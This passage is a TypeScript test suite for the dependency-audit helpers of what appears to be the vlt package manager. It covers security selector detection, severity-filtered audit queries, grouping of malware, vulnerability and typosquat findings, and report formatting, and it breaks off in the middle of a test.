import t from 'tap'
import {
  isSecuritySelector,
  isSecurityAuditSelector,
  buildAuditQuery,
  aggregateBySeverity,
  emptySummary,
  filterAuditResult,
  formatAuditSummary,
  formatSeverityHeading,
  nonEmptySeverityBuckets,
  formatDependencyBreakdown,
  categoryCounts,
  scanCoverage,
} from '../src/audit-helpers.ts'
import type {
  AuditPackage,
  AuditResult,
} from '../src/audit-helpers.ts'
import type { PackageAlert } from '@vltpkg/security-archive'

/** LeveledInsights fixture for malware/severity insights. */
const leveled = (
  overrides: Partial<{
    critical: boolean
    high: boolean
    medium: boolean
    low: boolean
  }> = {},
) => ({
  critical: false,
  high: false,
  medium: false,
  low: false,
  ...overrides,
})

/** SquatInsights fixture. */
const squatInsights = (
  overrides: Partial<{ critical: boolean; medium: boolean }> = {},
) => ({
  critical: false,
  medium: false,
  ...overrides,
})

/** Outbound-edges fixture: an importer's `edgesOut`, one entry per direct dependency. */
const edgesOutTo = (...deps: { id: string; name?: string }[]) =>
  new Map(deps.map(to => [to.name ?? to.id, { to }]))

/**
 * Brand a plain fixture so `isNode` from `@vltpkg/graph` accepts it.
 * `aggregateBySeverity` narrows its `unknown` inputs with `isNode`,
 * which requires `manifest` plus the `Symbol.toStringTag` brand.
 * Fixtures that deliberately omit `id` stay invalid under `isNode`, so
 * the "missing id" cases below still exercise the reject path.
 */
const asNode = (o: unknown): unknown =>
  typeof o === 'object' && o !== null ?
    {
      manifest: {},
      // buildDependencyPath walks edgesIn; an empty map ends the walk
      // immediately, leaving `path` undefined
      edgesIn: new Map(),
      ...o,
      [Symbol.toStringTag]: '@vltpkg/graph.Node',
    }
  : o

/** `aggregateBySeverity`, with the fixtures branded as graph Nodes. */
const aggregate = (
  nodes: unknown[],
  importers: Set<unknown>,
  warn?: (message: string) => void,
  securityArchive?: { get?: (depId: string) => unknown },
) =>
  aggregateBySeverity(
    nodes.map(asNode),
    new Set([...importers].map(asNode)),
    warn,
    securityArchive,
  )

/** AuditPackage fixture, for tests that don't care about identity. */
const makePkg = (
  overrides: Partial<AuditPackage> = {},
): AuditPackage => ({
  name: 'pkg',
  version: '1.0.0',
  alerts: [],
  cves: [],
  direct: false,
  ...overrides,
})

/** AuditResult fixture; pass a full `summary` to populate buckets. */
const makeResult = (
  overrides: Partial<AuditResult> = {},
): AuditResult => ({
  summary: emptySummary(),
  total: 0,
  directCount: 0,
  indirectCount: 0,
  ...overrides,
})

t.test('isSecuritySelector', async t => {
  t.test('detects security selectors', async t => {
    t.equal(isSecuritySelector(':malware'), true)
    t.equal(isSecuritySelector(':vulnerable'), true)
    t.equal(isSecuritySelector(':vuln'), true)
    t.equal(isSecuritySelector(':severity(critical)'), true)
    t.equal(isSecuritySelector(':cve'), true)
    t.equal(isSecuritySelector(':cwe'), true)
    t.equal(isSecuritySelector(':squat'), true)
    t.equal(isSecuritySelector(':scripts'), true)
  })

  t.test('rejects non-security selectors', async t => {
    t.equal(isSecuritySelector(':prod'), false)
    t.equal(isSecuritySelector('*'), false)
    t.equal(isSecuritySelector('#foo'), false)
    t.equal(isSecuritySelector(':workspace'), false)
    t.equal(isSecuritySelector(':root'), false)
  })

  t.test('detects security selectors in complex queries', async t => {
    t.equal(isSecuritySelector(':root > :malware'), true)
    t.equal(isSecuritySelector(':malware, :prod'), true)
    t.equal(isSecuritySelector('*:workspace > :squat'), true)
  })
})

t.test('isSecurityAuditSelector', async t => {
  t.test('detects genuine audit selectors', async t => {
    t.equal(isSecurityAuditSelector(':malware'), true)
    t.equal(isSecurityAuditSelector(':vulnerable'), true)
    t.equal(isSecurityAuditSelector(':vuln'), true)
    t.equal(isSecurityAuditSelector(':severity(critical)'), true)
    t.equal(isSecurityAuditSelector(':cve'), true)
    t.equal(isSecurityAuditSelector(':cwe'), true)
    t.equal(isSecurityAuditSelector(':squat'), true)
  })

  t.test(
    'rejects a standalone :scripts selector, unlike isSecuritySelector',
    async t => {
      t.equal(isSecurityAuditSelector(':scripts'), false)
      t.equal(isSecuritySelector(':scripts'), true)
    },
  )

  t.test(
    'still detects audit selectors combined with :scripts',
    async t => {
      t.equal(isSecurityAuditSelector(':scripts, :malware'), true)
      t.equal(isSecurityAuditSelector(':scripts:squat'), true)
    },
  )

  t.test('rejects non-security selectors', async t => {
    t.equal(isSecurityAuditSelector(':prod'), false)
    t.equal(isSecurityAuditSelector('*'), false)
    t.equal(isSecurityAuditSelector('#foo'), false)
  })
})

t.test('buildAuditQuery', async t => {
  // Pin the exact comparator strings, not just substring presence --
  // the query engine's scale is critical=0 ... low=3 (lower = more
  // severe), so "at or above" a level must use `<=`, not `>`/`>=`.
  //
  // :malware is a binary selector (no parameters), so we use :vuln
  // for severity-based filtering. It (and :squat, which only has
  // critical/medium kinds) must still appear at every level -- see
  // the "queries :malware/:squat at every level" tests below, which
  // encode that requirement independently of the exact comparator
  // syntax so a future refactor can't silently drop a category again
  // the way the pinned strings alone let happen here.

  t.test('queries :malware at every level, not just low', async t => {
    // :malware has no comparator, so it must appear unqualified at
    // every level -- if it's missing at medium/high/critical, the
    // DSS query drops malware-only findings before they ever reach
    // aggregateBySeverity, regardless of --audit-level.
    for (const level of ['low', 'medium', 'high', 'critical']) {
      t.match(
        buildAuditQuery(level),
        /:malware\b/,
        `${level} includes :malware`,
      )
    }
  })

  t.test('queries :squat at every level, not just low', async t => {
    // :squat only has two kinds (critical=0, medium=2 -- see
    // src/query/src/pseudo/squat.ts), but it must appear in some form
    // at every level, or typosquat findings vanish above low even
    // though the engine can express e.g. :squat(critical).
    for (const level of ['low', 'medium', 'high', 'critical']) {
      t.match(
        buildAuditQuery(level),
        /:squat\b/,
        `${level} includes :squat`,
      )
    }
  })

  t.test('never queries :scripts at any level', async t => {
    // aggregateBySeverity has no handling for lifecycle-script
    // findings (no insights.scripts bucket, no "scripts" category),
    // so :scripts matches were being fetched and then silently
    // discarded -- query work with no output. Drop it until scripts
    // are surfaced as an actual audit category.
    for (const level of ['low', 'medium', 'high', 'critical']) {
      t.notMatch(
        buildAuditQuery(level),
        /:scripts\b/,
        `${level} excludes :scripts`,
      )
    }
  })

  t.test('returns full query for low level', async t => {
    const q = buildAuditQuery('low')
    t.equal(q, ':malware, :vulnerable, :severity(<=low), :squat')
  })

  t.test('returns filtered query for medium level', async t => {
    const q = buildAuditQuery('medium')
    t.equal(
      q,
      ':malware, :vuln(<=medium), :severity(<=medium), :squat(<=medium)',
    )
  })

  t.test('returns filtered query for high level', async t => {
    const q = buildAuditQuery('high')
    t.equal(
      q,
      ':malware, :vuln(<=high), :severity(<=high), :squat(critical)',
    )
  })

  t.test('returns filtered query for critical level', async t => {
    const q = buildAuditQuery('critical')
    t.equal(
      q,
      ':malware, :vuln(critical), :severity(critical), :squat(critical)',
    )
  })

  t.test('defaults to low for unknown level', async t => {
    const q = buildAuditQuery('unknown')
    const low = buildAuditQuery('low')
    t.equal(q, low)
  })
})

t.test('aggregateBySeverity', async t => {
  const importer = { id: 'importer-1' }
  const importers = new Set([importer])

  t.test('groups nodes by severity', async t => {
    const nodes = [
      {
        id: 'pkg-critical-id',
        name: 'pkg-critical',
        version: '1.0.0',
        insights: { malware: leveled({ critical: true }) },
      },
      {
        id: 'pkg-high-id',
        name: 'pkg-high',
        version: '2.0.0',
        insights: { malware: leveled({ high: true }) },
      },
      {
        id: 'pkg-low-id',
        name: 'pkg-low',
        version: '3.0.0',
        insights: { severity: leveled({ low: true }) },
      },
    ]
    const result = aggregate(nodes, importers)
    t.equal(result.summary.critical.length, 1)
    t.equal(result.summary.high.length, 1)
    t.equal(result.summary.low.length, 1)
    t.equal(result.total, 3)
  })

  t.test(
    'groups leveled insights with medium severity as medium',
    async t => {
      const nodes = [
        {
          id: 'pkg-medium-id',
          name: 'pkg-medium',
          version: '1.0.0',
          insights: { severity: leveled({ medium: true }) },
        },
      ]
      const result = aggregate(nodes, importers)
      t.equal(result.summary.medium.length, 1)
      // insights.severity and insights.vuln describe the same CVE data,
      // so they collapse into a single 'vulnerability' alert rather than
      // reporting one finding twice
      t.equal(
        result.summary.medium[0]?.alerts[0]?.type,
        'vulnerability',
        'severity insights surface as a vulnerability alert',
      )
    },
  )

  t.test('collects CVE ids from insights.cve', async t => {
    const nodes = [
      {
        id: 'pkg-cve-id',
        name: 'pkg-cve',
        version: '1.0.0',
        insights: {
          severity: leveled({ high: true }),
          cve: ['CVE-2021-1234', 'CVE-2021-5678'],
        },
      },
    ]
    const result = aggregate(nodes, importers)
    t.strictSame(result.summary.high[0]?.cves, [
      'CVE-2021-1234',
      'CVE-2021-5678',
    ])
  })

  t.test('defaults cves to an empty array when absent', async t => {
    const nodes = [
      {
        id: 'pkg-no-cve-id',
        name: 'pkg-no-cve',
        version: '1.0.0',
        insights: { severity: leveled({ high: true }) },
      },
    ]
    const result = aggregate(nodes, importers)
    t.strictSame(result.summary.high[0]?.cves, [])
  })

  t.test('identifies direct vs transitive dependencies', async t => {
    const directNode = {
      id: 'direct-id',
      name: 'direct-pkg',
      version: '1.0.0',
      insights: { malware: leveled({ high: true }) },
    }
    const transitiveNode = {
      id: 'transitive-id',
      name: 'transitive-pkg',
      version: '2.0.0',
      insights: { malware: leveled({ high: true }) },
      // not declared in any importer's edgesOut -- only reachable
      // through directNode, not an importer
    }
    // scopedImporter's edgesOut declares directNode as a direct
    // dependency; transitiveNode isn't, so it's transitive.
    const scopedImporter = {
      id: 'importer-1',
      edgesOut: edgesOutTo(directNode),
    }
    const result = aggregate(
      [directNode, transitiveNode],
      new Set([scopedImporter]),
    )
    t.equal(result.directCount, 1)
    t.equal(result.indirectCount, 1)
    t.ok(result.summary.high[0])
    t.ok(result.summary.high[1])
    t.equal(result.summary.high[0]!.direct, true)
    t.equal(result.summary.high[1]!.direct, false)
  })

  t.test(
    'treats a flagged importer itself as direct (no edgesIn needed)',
    async t => {
      const nodes = [
        {
          id: 'importer-1',
          name: 'importer-pkg',
          version: '1.0.0',
          insights: { malware: leveled({ high: true }) },
        },
      ]
      const result = aggregate(nodes, importers)
      t.equal(result.directCount, 1)
      t.equal(result.summary.high[0]?.direct, true)
    },
  )

  t.test(
    'treats a node with no edgesIn and no importer match as transitive',
    async t => {
      const nodes = [
        {
          id: 'orphan-id',
          name: 'orphan-pkg',
          version: '1.0.0',
          insights: { malware: leveled({ high: true }) },
        },
      ]
      const result = aggregate(nodes, importers)
      t.equal(result.directCount, 0)
      t.equal(result.indirectCount, 1)
      t.equal(result.summary.high[0]?.direct, false)
    },
  )

  t.test('skips nodes without insights', async t => {
    const nodes = [
      { name: 'clean-pkg', version: '1.0.0' },
      { name: 'another-clean', version: '2.0.0', insights: {} },
    ]
    const result = aggregate(nodes, importers)
    t.equal(result.total, 0)
  })

  t.test('does not report alerts the feed marks ignore', async t => {
    const archive = {
      get: () => ({
        alerts: [
          {
            key: '1',
            type: 'envVars',
            severity: 'low',
            category: 'supplyChainRisk',
            action: 'ignore',
          },
          {
            key: '2',
            type: 'cve',
            severity: 'high',
            category: 'vulnerability',
            action: 'monitor',
          },
        ],
      }),
    }
    const nodes = [
      {
        id: 'mixed-id',
        name: 'mixed-pkg',
        version: '1.0.0',
        insights: { scanned: true },
      },
    ]
    const result = aggregate(nodes, importers, undefined, archive)
    t.equal(result.total, 1)
    t.equal(result.summary.high.length, 1, 'graded by the kept alert')
    t.strictSame(
      result.summary.high[0]?.alerts.map(a => a.type),
      ['cve'],
      'the ignored alert is gone entirely, not just unrendered',
    )
  })

  t.test('drops a package whose every alert is ignored', async t => {
    const archive = {
      get: () => ({
        alerts: [
          {
            key: '1',
            type: 'networkAccess',
            severity: 'middle',
            category: 'supplyChainRisk',
            action: 'ignore',
          },
        ],
      }),
    }
    const nodes = [
      {
        id: 'noisy-id',
        name: 'noisy-pkg',
        version: '1.0.0',
        insights: { scanned: true },
      },
    ]
    t.equal(
      aggregate(nodes, importers, undefined, archive).total,
      0,
      'not a finding at all',
    )
  })

  t.test(
    'an unrecognized severity does not silently become low',
    async t => {
      const archiveWith = (alert: Record<string, unknown>) => ({
        get: () => ({ alerts: [alert] }),
      })
      const nodes = [
        {
          id: 'weird-id',
          name: 'weird-pkg',
          version: '1.0.0',
          insights: { scanned: true },
        },
      ]

      // Malware is severe whatever the feed calls it. Filed low it would
      // be dropped by --audit-level=high and the command would exit 0.
      const warnings: string[] = []
      const malware = aggregate(
        nodes,
        importers,
        m => warnings.push(m),
        archiveWith({
          key: '1',
          type: 'malware',
          severity: 'moderate',
          category: 'supplyChainRisk',
        }),
      )
      t.equal(malware.summary.critical.length, 1)
      t.equal(malware.summary.low.length, 0)
      t.match(
        warnings.join('\n'),
        /unrecognized severity "moderate" on malware alert/,
        'and says so rather than doing it quietly',
      )
      t.equal(
        filterAuditResult(malware, 'high').total,
        1,
        'so --audit-level=high still reports it',
      )

      // A non-malware finding has no such claim to make, so it lands low
      const other = aggregate(
        nodes,
        importers,
        () => {},
        archiveWith({
          key: '1',
          type: 'networkAccess',
          severity: 'Critical',
          category: 'supplyChainRisk',
        }),
      )
      t.equal(
        other.summary.low.length,
        1,
        'an unrecognized severity elsewhere is treated as low',
      )
    },
  )

  t.test('handles empty input', async t => {
    const result = aggregate([], importers)
    t.equal(result.total, 0)
    t.equal(result.directCount, 0)
    t.equal(result.indirectCount, 0)
  })

  t.test(
    'skips importers without an id instead of throwing',
    async t => {
      const malformedImporters = new Set([
        { notAnId: 'oops' },
        importer,
      ])
      const nodes = [
        {
          id: 'importer-1',
          name: 'importer-pkg',
          version: '1.0.0',
          insights: { malware: leveled({ high: true }) },
        },
      ]
      const result = aggregate(nodes, malformedImporters)
      t.equal(result.directCount, 1)
      t.equal(result.summary.high[0]?.direct, true)
    },
  )

  t.test('handles squat alerts', async t => {
    const nodes = [
      {
        id: 'squat-pkg-id',
        name: 'squat-pkg',
        version: '1.0.0',
        insights: { squat: squatInsights({ critical: true }) },
      },
    ]
    const result = aggregate(nodes, importers)
    t.equal(result.summary.critical.length, 1)
    t.ok(result.summary.critical[0])
    t.equal(result.summary.critical[0]!.alerts[0]?.type, 'squatting')
  })

  t.test('handles squat alerts with medium severity', async t => {
    const nodes = [
      {
        id: 'squat-medium-id',
        name: 'squat-medium-pkg',
        version: '1.0.0',
        insights: { squat: squatInsights({ medium: true }) },
      },
    ]
    const result = aggregate(nodes, importers)
    t.equal(result.summary.medium.length, 1)
    t.ok(result.summary.medium[0])
    t.equal(result.summary.medium[0]!.alerts[0]?.type, 'squatting')
  })

  t.test(
    'ignores leveled insights with no severity flags set',
    async t => {
      const nodes = [
        {
          id: 'clean-id',
          name: 'clean-pkg',
          version: '1.0.0',
          insights: { malware: leveled() },
        },
      ]
      const result = aggregate(nodes, importers)
      t.equal(result.total, 0)
    },
  )

  t.test(
    'ignores squat insights with no severity flags set',
    async t => {
      const nodes = [
        {
          id: 'clean-squat-id',
          name: 'clean-squat-pkg',
          version: '1.0.0',
          insights: { squat: squatInsights() },
        },
      ]
      const result = aggregate(nodes, importers)
      t.equal(result.total, 0)
    },
  )

  t.test(
    'defaults to a no-op warn callback when none is provided',
    async t => {
      const nodes = [
        // fails isLeveledInsights: missing the "low" key, would warn
        // if a callback were supplied
        {
          id: 'malformed-malware-id',
          insights: {
            malware: { critical: true, high: false, medium: false },
          },
        },
      ]
      // no warn callback passed -- exercises the default `() => {}`
      const result = aggregate(nodes, importers)
      t.equal(result.total, 0)
    },
  )

  t.test('ignores nodes with malformed or missing data', async t => {
    const warnings: string[] = []
    const nodes = [
      // fails isLeveledInsights: missing the "low" key
      {
        id: 'malformed-malware-id',
        insights: {
          malware: { critical: true, high: false, medium: false },
        },
      },
      // fails isLeveledInsights: non-boolean value
      {
        id: 'malformed-severity-id',
        insights: { severity: { ...leveled(), low: 'yes' } },
      },
      // fails isSquatInsights: missing the "medium" key
      {
        id: 'malformed-squat-id',
        insights: { squat: { critical: true } },
      },
      // insights is null
      { id: 'null-insights-id', insights: null },
      // has insights, but no id
      { insights: { malware: leveled({ critical: true }) } },
    ]
    const result = aggregate(nodes, importers, message =>
      warnings.push(message),
    )
    t.equal(result.total, 0)
    // only the three nodes with a present-but-malformed category warn;
    // the missing-id/null-insights nodes are dropped before that check
    t.equal(warnings.length, 3)
    t.match(warnings[0], /malformed-malware-id/)
    t.match(warnings[1], /malformed-severity-id/)
    t.match(warnings[2], /malformed-squat-id/)
  })

  t.test(
    'does not warn for absent (as opposed to malformed) insights',
    async t => {
      const warnings: string[] = []
      const nodes = [
        { id: 'clean-id', insights: {} },
        { id: 'no-alerts-id', insights: { malware: leveled() } },
      ]
      aggregate(nodes, importers, message => warnings.push(message))
      t.equal(warnings.length, 0)
    },
  )

  t.test(
    'accumulates alerts from multiple insight categories on one node',
    async t => {
      const nodes = [
        {
          id: 'multi-id',
          name: 'multi-pkg',
          version: '1.0.0',
          insights: {
            malware: leveled({ high: true }),
            severity: leveled({ critical: true }),
            squat: squatInsights({ medium: true }),
          },
        },
      ]
      const result = aggregate(nodes, importers)
      t.equal(result.total, 1)
      t.equal(result.summary.critical.length, 1)
      t.equal(result.summary.high.length, 0)
      const pkg = result.summary.critical[0]
      t.ok(pkg)
      t.equal(pkg!.alerts.length, 3)
      t.strictSame(
        pkg!.alerts.map(a => a.type).sort(),
        ['malware', 'squatting', 'vulnerability'],
        'one alert per distinct finding, severity folded into vulnerability',
      )
    },
  )

  t.test(
    'folds severity and vuln insights into one alert at the worse level',
    async t => {
      // `severity` and `vuln` describe the same CVE data, so a single
      // vulnerability sets both. Emitting one alert per insight would
      // report it twice and double the vulnerable count.
      for (const [severity, vuln, expected] of [
        [
          leveled({ high: true }),
          leveled({ critical: true }),
          'critical',
        ],
        [
          leveled({ critical: true }),
          leveled({ high: true }),
          'critical',
        ],
        [leveled({ low: true }), leveled({ low: true }), 'low'],
      ] as const) {
        const result = aggregate(
          [
            {
              id: 'both-id',
              name: 'both',
              insights: { severity, vuln },
            },
          ],
          importers,
        )
        t.equal(result.total, 1)
        const pkg = result.summary[expected][0]
        t.ok(pkg, `bucketed as ${expected}`)
        t.strictSame(
          pkg?.alerts.map(a => a.type),
          ['vulnerability'],
          'one alert, not one per insight',
        )
      }
    },
  )

  t.test('warns for malformed vuln insights', async t => {
    const warnings: string[] = []
    // fails isLeveledInsights: missing the "critical" key
    const result = aggregate(
      [
        {
          id: 'malformed-vuln-id',
          insights: {
            vuln: { low: false, medium: false, high: false },
          },
        },
      ],
      importers,
      message => warnings.push(message),
    )
    t.equal(
      result.total,
      0,
      'the malformed category yields no alerts',
    )
    t.equal(warnings.length, 1)
    t.match(
      warnings[0],
      /malformed vuln insights for malformed-vuln-id/,
    )
  })

  t.test('defaults name and version when missing', async t => {
    const nodes = [
      {
        id: 'no-name-id',
        insights: { malware: leveled({ critical: true }) },
      },
    ]
    const result = aggregate(nodes, importers)
    t.equal(result.summary.critical.length, 1)
    t.equal(result.summary.critical[0]?.name, 'unknown')
    t.equal(result.summary.critical[0]?.version, 'unknown')
  })
})

t.test('filterAuditResult', async t => {
  t.test('filters out severities below minimum', async t => {
    // a and c are direct, b and d are transitive
    const result = makeResult({
      summary: {
        critical: [makePkg({ name: 'a', direct: true })],
        high: [makePkg({ name: 'b' })],
        medium: [makePkg({ name: 'c', direct: true })],
        low: [makePkg({ name: 'd' })],
      },
      total: 4,
      directCount: 2,
      indirectCount: 2,
    })

    const high = filterAuditResult(result, 'high')
    t.equal(high.total, 2)
    t.equal(high.summary.critical.length, 1)
    t.equal(high.summary.high.length, 1)
    t.equal(high.summary.medium.length, 0)
    t.equal(high.summary.low.length, 0)
    // recomputed from a (direct) and b (transitive) only, not the
    // pre-filter totals covering all four packages
    t.equal(high.directCount, 1)
    t.equal(high.indirectCount, 1)

    const medium = filterAuditResult(result, 'medium')
    t.equal(medium.total, 3)
    t.equal(medium.summary.critical.length, 1)
    t.equal(medium.summary.high.length, 1)
    t.equal(medium.summary.medium.length, 1)
    t.equal(medium.summary.low.length, 0)
    t.equal(medium.directCount, 2)
    t.equal(medium.indirectCount, 1)

    const critical = filterAuditResult(result, 'critical')
    t.equal(critical.total, 1)
    t.equal(critical.summary.critical.length, 1)
    t.equal(critical.summary.high.length, 0)
    t.equal(critical.summary.medium.length, 0)
    t.equal(critical.summary.low.length, 0)
    t.equal(critical.directCount, 1)
    t.equal(critical.indirectCount, 0)

    const low = filterAuditResult(result, 'low')
    t.equal(low.total, 4)
    t.equal(low.summary.critical.length, 1)
    t.equal(low.summary.high.length, 1)
    t.equal(low.summary.medium.length, 1)
    t.equal(low.summary.low.length, 1)
    t.equal(low.directCount, 2)
    t.equal(low.indirectCount, 2)
  })

  t.test(
    'keeps an actively exploited finding below the threshold',
    async t => {
      const exploited = makePkg({
        name: 'exploited-pkg',
        alerts: [
          {
            key: '1',
            type: 'cve',
            severity: 'low',
            category: 'vulnerability',
            props: {
              lastPublish: '2026-01-01',
              kevs: [{ id: 'CVE-2026-0001' }],
            },
          },
        ],
        direct: true,
      })
      const result = makeResult({
        summary: {
          ...emptySummary(),
          low: [exploited, makePkg({ name: 'quiet-pkg' })],
        },
        total: 2,
        directCount: 1,
        indirectCount: 1,
      })

      const critical = filterAuditResult(result, 'critical')
      t.equal(
        critical.total,
        1,
        'the exploited finding survives a critical threshold',
      )
      t.equal(critical.summary.low.length, 1)
      t.equal(
        critical.summary.low[0]?.name,
        'exploited-pkg',
        'and the unexploited low finding is still dropped',
      )
      t.equal(
        critical.directCount,
        1,
        'counts are recomputed from what survived',
      )
      t.equal(critical.indirectCount, 0)
      // severity is left exactly as the feed graded it
      t.equal(
        critical.summary.critical.length,
        0,
        'it is not promoted out of its graded bucket',
      )
    },
  )

  t.test('preserves empty result structure', async t => {
    const filtered = filterAuditResult(makeResult(), 'high')
    t.equal(filtered.total, 0)
    t.equal(filtered.directCount, 0)
    t.equal(filtered.indirectCount, 0)
  })
})

t.test('nonEmptySeverityBuckets', async t => {
  t.test(
    'returns only non-empty buckets in severityOrder',
    async t => {
      const result = makeResult({
        summary: {
          ...emptySummary(),
          critical: [makePkg({ name: 'pkg-c' })],
          low: [makePkg({ name: 'pkg-l' })],
        },
        total: 2,
      })
      const buckets = nonEmptySeverityBuckets(result)
      t.strictSame(
        buckets.map(b => b.severity),
        ['critical', 'low'],
      )
      t.equal(buckets[0]?.pkgs[0]?.name, 'pkg-c')
      t.equal(buckets[1]?.pkgs[0]?.name, 'pkg-l')
    },
  )

  t.test('returns an empty array for an empty result', async t => {
    t.strictSame(nonEmptySeverityBuckets(makeResult()), [])
  })
})

t.test('formatSeverityHeading', async t => {
  t.test('formats without color styling by default', async t => {
    t.equal(formatSeverityHeading('critical', 2), 'critical (2)')
  })

  t.test('formats each severity level with its count', async t => {
    t.equal(formatSeverityHeading('high', 1), 'high (1)')
    t.equal(formatSeverityHeading('medium', 3), 'medium (3)')
    t.equal(formatSeverityHeading('low', 0), 'low (0)')
  })

  t.test(
    'applies color styling without altering the text when colors is true',
    async t => {
      t.match(
        formatSeverityHeading('critical', 2, true),
        /critical \(2\)/,
      )
    },
  )
})

t.test('categoryCounts', async t => {
  t.test(
    'counts alerts by category across all severities',
    async t => {
      const result = makeResult({
        summary: {
          ...emptySummary(),
          critical: [
            makePkg({
              name: 'a',
              alerts: [
                {
                  key: '1',
                  type: 'malware',
                  severity: 'critical',
                  category: 'supplyChainRisk',
                },
              ],
            }),
          ],
          high: [
            makePkg({
              name: 'b',
              alerts: [
                {
                  key: '2',
                  type: 'severity',
                  severity: 'high',
                  category: 'vulnerability',
                },
                {
                  key: '3',
                  type: 'squatting',
                  severity: 'high',
                  category: 'supplyChainRisk',
                },
              ],
            }),
          ],
          medium: [
            makePkg({
              name: 'c',
              alerts: [
                {
                  key: '4',
                  type: 'squatting',
                  severity: 'middle',
                  category: 'supplyChainRisk',
                },
              ],
            }),
          ],
        },
      })
      t.strictSame(categoryCounts(result), {
        malware: 1,
        vulnerable: 1,
        squat: 2,
      })
    },
  )

  t.test(
    'a package counts once per category, not once per alert',
    async t => {
      const result = makeResult({
        summary: {
          ...emptySummary(),
          high: [
            makePkg({
              name: 'many-cves',
              alerts: [
                {
                  key: '1',
                  type: 'cve',
                  severity: 'high',
                  category: 'vulnerability',
                },
                {
                  key: '2',
                  type: 'cve',
                  severity: 'high',
                  category: 'vulnerability',
                },
                {
                  key: '3',
                  type: 'mediumCVE',
                  severity: 'middle',
                  category: 'vulnerability',
                },
              ],
            }),
          ],
        },
        total: 1,
        indirectCount: 1,
      })
      t.equal(
        categoryCounts(result).vulnerable,
        1,
        'three vulnerability alerts on one package count once',
      )
    },
  )

  t.test('returns all zeros for an empty result', async t => {
    t.strictSame(categoryCounts(makeResult()), {
      malware: 0,
      vulnerable: 0,
      squat: 0,
    })
  })
})

t.test('formatDependencyBreakdown', async t => {
  t.test('singularizes a single direct dependency', async t => {
    t.equal(
      formatDependencyBreakdown(
        makeResult({ directCount: 1, indirectCount: 0 }),
      ),
      '1 direct dependency, 0 transitive',
    )
  })

  t.test('pluralizes multiple direct dependencies', async t => {
    t.equal(
      formatDependencyBreakdown(
        makeResult({ directCount: 2, indirectCount: 3 }),
      ),
      '2 direct dependencies, 3 transitive',
    )
  })
})

t.test('formatAuditSummary', async t => {
  t.test('returns zero issues message', async t => {
    t.equal(
      formatAuditSummary(makeResult()),
      '0 packages with security issues\n',
    )
  })

  t.test('formats singular issue and dependency', async t => {
    const result = makeResult({
      summary: {
        ...emptySummary(),
        high: [
          makePkg({
            name: 'pkg-a',
            alerts: [
              {
                key: '1',
                type: 'malware',
                severity: 'high',
                category: 'supplyChainRisk',
              },
            ],
            direct: true,
          }),
        ],
      },
      total: 1,
      directCount: 1,
      indirectCount: 0,
    })
    const output = formatAuditSummary(result)
    t.match(output, /^1 package with security issues$/m)
    t.match(output, /^1 malware$/m)
    t.match(output, /^1 high$/m)
    t.match(output, /high\s+pkg-a@1\.0\.0\s+malware: high/)
    t.match(output, /1 direct dependency, 0 transitive/)
    // the counts are the conclusion of the report, so they land after
    // the findings rather than scrolling off the top of a long one
    t.ok(
      output.indexOf('pkg-a@1.0.0') <
        output.indexOf('1 package with security issues'),
      'summary renders after the findings',
    )
    t.ok(
      output.indexOf('1 package with security issues') <
        output.indexOf('1 direct dependency'),
      'direct/transitive breakdown closes the summary',
    )
  })

  t.test(
    'labels alerts in plain English rather than feed type names',
    async t => {
      const result = makeResult({
        summary: {
          ...emptySummary(),
          medium: [
            makePkg({
              name: 'risky',
              alerts: [
                {
                  key: '1',
                  type: 'urlStrings',
                  severity: 'low',
                  category: 'supplyChainRisk',
                },
                {
                  key: '2',
                  type: 'envVars',
                  // the feed spells medium "middle"
                  severity: 'middle',
                  category: 'supplyChainRisk',
                },
                {
                  key: '3',
                  type: 'mediumCVE',
                  severity: 'middle',
                  category: 'vulnerability',
                },
              ],
            }),
          ],
        },
        total: 1,
        directCount: 0,
        indirectCount: 1,
      })
      const output = formatAuditSummary(result)
      t.match(output, /embedded URL: low/, 'urlStrings is relabelled')
      t.match(
        output,
        /reads environment variables: medium/,
        'envVars is relabelled and middle reads as medium',
      )
      t.match(
        output,
        /vulnerability: medium/,
        'the CVE grade in the type name is not repeated as a label',
      )
      t.notMatch(
        output,
        /urlStrings|envVars|mediumCVE|middle/,
        'no feed vocabulary reaches the user',
      )
    },
  )

  t.test(
    'reports a fix per finding, scoped to direct vs transitive',
    async t => {
      const vulnAlert = (
        overrides: Record<string, unknown> = {},
      ) => ({
        key: '1',
        type: 'cve' as const,
        severity: 'high' as const,
        category: 'vulnerability' as const,
        props: {
          lastPublish: '2026-01-01',
          firstPatchedVersionIdentifier: '2.0.0',
          ...overrides,
        },
      })

      const direct = formatAuditSummary(
        makeResult({
          summary: {
            ...emptySummary(),
            high: [
              makePkg({
                name: 'direct-pkg',
                alerts: [vulnAlert()],
                direct: true,
              }),
            ],
          },
          total: 1,
          directCount: 1,
        }),
      )
      t.match(
        direct,
        /fix: vlt install direct-pkg@2\.0\.0/,
        'a direct dependency can be upgraded in place',
      )
      t.notMatch(
        direct,
        />=/,
        'pins the patched version rather than allowing any later major',
      )

      const transitive = formatAuditSummary(
        makeResult({
          summary: {
            ...emptySummary(),
            high: [
              makePkg({
                name: 'deep-pkg',
                alerts: [vulnAlert()],
                path: 'root > mid-pkg > deep-pkg',
                pathCount: 1,
              }),
            ],
          },
          total: 1,
          indirectCount: 1,
        }),
      )
      t.match(
        transitive,
        /patched in 2\.0\.0/,
        'the patched version is still reported for a transitive dep',
      )
      t.match(
        transitive,
        /via root > mid-pkg > deep-pkg/,
        'the route to the package is reported',
      )
      t.notMatch(
        transitive,
        /vlt install deep-pkg/,
        'does not tell the user to install a package they never asked for',
      )
      t.notMatch(
        transitive,
        /fix: update mid-pkg/,
        'does not assert a parent upgrade we have not verified exists',
      )

      const unfixed = formatAuditSummary(
        makeResult({
          summary: {
            ...emptySummary(),
            high: [
              makePkg({
                name: 'unfixed-pkg',
                alerts: [
                  {
                    key: '1',
                    type: 'cve',
                    severity: 'high',
                    category: 'vulnerability',
                  },
                ],
              }),
            ],
          },
          total: 1,
          indirectCount: 1,
        }),
      )
      t.match(
        unfixed,
        /fix: none available yet/,
        'a vulnerability with no patched release says so',
      )

      const noPatchExpected = formatAuditSummary(
        makeResult({
          summary: {
            ...emptySummary(),
            low: [
              makePkg({
                name: 'chatty-pkg',
                alerts: [
                  {
                    key: '1',
                    type: 'networkAccess',
                    severity: 'low',
                    category: 'supplyChainRisk',
                  },
                ],
              }),
            ],
          },
          total: 1,
          indirectCount: 1,
        }),
      )
      t.notMatch(
        noPatchExpected,
        /fix:/,
        'a non-vulnerability finding has no patch to wait for',
      )
    },
  )

  t.test(
    'reports every route to a shared package, not just one',
    async t => {
      const output = formatAuditSummary(
        makeResult({
          summary: {
